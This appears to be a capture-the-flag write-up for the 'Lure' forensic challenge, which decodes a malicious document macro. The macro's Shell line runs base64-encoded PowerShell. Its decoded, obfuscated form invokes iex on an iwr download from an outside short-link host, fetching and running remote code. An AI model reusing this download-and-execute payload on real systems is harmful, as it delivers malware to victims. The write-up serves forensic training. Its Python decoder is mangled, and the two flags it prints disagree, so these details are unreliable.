# Lure (Forensic Challenge)

*[image unavailable]*
*[image unavailable]*

```bash
ExecFile = Shell("pOweRshElL -ec cABPAHcARQByAHMAaABFAGwATAAgACQAKAAtAGoATwBpAE4AKAAoACQAUABzAGgATwBNAGUAWwA0AF0AKQAsACgAIgAkAFAAcwBIAG8ATQBFACIAKQBbACsAMQA1AF0ALAAiAHgAIgApADsAKQAoAGkAdwByACAAJAAoACgAIgB7ADUAfQB7ADIANQB9AHsAOAB9AHsANwB9AHsAMAB9AHsAMQA0AH0AewAzAH0AewAyADEAfQB7ADIAfQB7ADIAMgB9AHsAMQA1AH0AewAxADYAfQB7ADMAMQB9AHsAMgA4AH0AewAxADEAfQB7ADIANgB9AHsAMQA3AH0AewAyADMAfQB7ADIANwB9AHsAMgA5AH0AewAxADAAfQB7ADEAfQB7ADYAfQB7ADIANAB9AHsAMwAwAH0AewAxADgAfQB7ADEAMwB9AHsAMQA5AH0AewAxADIAfQB7ADkAfQB7ADIAMAB9AHsANAB9ACIALQBmACAAIgBCACIALAAiAFUAIgAsACIANAAiACwAIgBCACIALAAiACUANwBEACIALAAiAGgAdAAiACwAIgBSAF8AZAAiACwAIgAvAC8AbwB3AC4AbAB5AC8ASABUACIALAAiAHAAOgAiACwAIgBUACIALAAiADAAIgAsACIAXwAiACwAIgBOACIALAAiAE0AIgAsACIAJQA3ACIALAAiAEUAIgAsACIAZgAiACwAIgAxAFQAIgAsACIAdQAiACwAIgBlACIALAAiADUAIgAsACIAawAiACwAIgBSACIALAAiAGgAIgAsACIAMAAiACwAIgB0ACIALAAiAHcAIgAsACIAXwAiACwAIgBsACIALAAiAFkAIgAsACIAQwAiACwAIgBVACIAKQApACkA", vbNormalFocus)
```

*[image unavailable]*

```bash
pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","","l","Y","C","U")))
```

*[image unavailable]*

5,25,8,7,0,14,3,21,2,22,15,16,31,28,11,26,17,23,27,29,10,1,6,24,30,18,13,19,12,9,20,4

*[image unavailable]*

B,U,4,B,%7D,ht,R_d,[//ow.ly/HT,p:,T,0,,N,M,%7,E,f,1T,u,e,5,k,R,h,0,t,w,,l,Y,C,U](https://ow.ly/HT,p:,T,0,,N,M,%257,E,f,1T,u,e,5,k,R,h,0,t,w,,l,Y,C,U)

```bash
pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("
5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"

-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","","l","Y","C","U" )))
```

```bash
def main():
characters_str: str = 'B,U,4,B,%7D,ht,R_d,//ow.ly/HT,p:,T,0,,N,M,%7,E,f,1T,u,e,5,k,R,h,0,t,w,,l,Y,C,U'
locations_str: str = '5,25,8,7,0,14,3,21,2,22,15,16,31,28,11,26,17,23,27,29,10,1,6,24,30,18,13,19,12,3,20,4'
join_chr = ','

characters = tuple(ch for ch in characters_str.split(join_chr))
locations = tuple(int(x) for x in locations_str.split(join_chr))

output = ''.join(characters[loc] for loc in locations)
print(f'Output: {output}')

if name == 'main':
main()
```

*[image unavailable]*

```bash
Output: http://ow.ly/HTB{k4REfUlw1ThY0UR_d0CuMeNB5}

http://ow.ly/

HTB{k4REfUlw1ThY0UR_d0CuMeNBT}
```
